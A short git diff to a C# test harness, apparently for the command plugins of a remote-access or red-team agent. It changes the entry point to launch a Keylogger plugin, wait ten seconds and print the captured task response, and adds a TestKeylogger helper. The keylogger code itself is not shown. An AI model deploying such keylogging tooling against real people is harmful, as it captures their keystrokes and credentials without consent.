@@ -21,7 +21,13 @@ namespace TestPluginLoader
         public static AssemblyLoadContext loadcontext = new AssemblyLoadContext("commands");
         static async Task Main(string[] args)
         {
-            await TestLs();
+            Console.WriteLine("Starting Keylogger.");
+            Task.Run(() => TestKeylogger());
+            Console.WriteLine("Delaying.");
+            await Task.Delay(10000);
+            Console.WriteLine("Done.");
+            var res = await TaskResponseHandler.GetTaskResponsesAsync();
+            Console.WriteLine(res.FirstOrDefault());
             Console.WriteLine("Finished.");
             Console.ReadKey();
         }
@@ -97,6 +103,13 @@ namespace TestPluginLoader
             new Ps().Execute(parameters);
             var res = await TaskResponseHandler.GetTaskResponsesAsync();
             Console.WriteLine(res.FirstOrDefault());
+        }
+
+        static async Task TestKeylogger()
+        {
+            Dictionary<string, string> parameters = new Dictionary<string, string>();
+            parameters.Add("task-id", "1");
+            new Keylogger().Execute(parameters);
         }
     }
 }
